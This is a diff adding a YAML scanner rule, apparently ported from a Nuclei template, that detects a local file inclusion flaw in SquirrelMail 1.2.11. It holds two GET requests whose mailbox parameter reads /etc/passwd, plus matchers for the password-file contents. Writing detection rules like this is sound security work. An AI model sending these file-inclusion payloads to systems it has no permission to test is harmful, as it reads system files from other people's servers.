@@ -1,0 +1,35 @@
+schema_version: 1
+id: "cortex.community:squirrelmail-lfi"
+rule_version: "1.0.0"
+requires:
+  engine_api: 1
+  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+info:
+  name: "SquirrelMail 1.2.11 - Local File Inclusion"
+  description: "SquirrelMail 1.2.11 is vulnerable to local file inclusion. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
+  references:
+    - "https://www.exploit-db.com/exploits/22793"
+  cwes: [22]
+  tags: ["lfi", "squirrelmail", "edb", "vuln", "nuclei", "auto-ported", "signal"]
+  remediation: "See the referenced advisory / template source for remediation."
+finding:
+  sink_type: "VULNERABLE_COMPONENT"
+  impact: "INFORMATION_DISCLOSURE"
+  severity: "High"
+  root_cause: "nuclei-ported-signal"
+execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
+steps:
+  - id: "probe0"
+    request: { method: "GET", path: "/src/read_body.php?mailbox=/etc/passwd&passed_id=1&" }
+  - id: "probe1"
+    request: { method: "GET", path: "/src/download.php?absolute_dl=true&passed_id=1&passed_ent_id=1&mailbox=/etc/passwd" }
+proof:
+  kind: "signal.v1"
+  assertions:
+    any:
+      - all:
+          - regex: { left: { ref: "steps.probe0.body" }, right: { value: "root:[x*]:0:0" } }
+          - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
+      - all:
+          - regex: { left: { ref: "steps.probe1.body" }, right: { value: "root:[x*]:0:0" } }
+          - eq: { left: { ref: "steps.probe1.status" }, right: { value: 200 } }
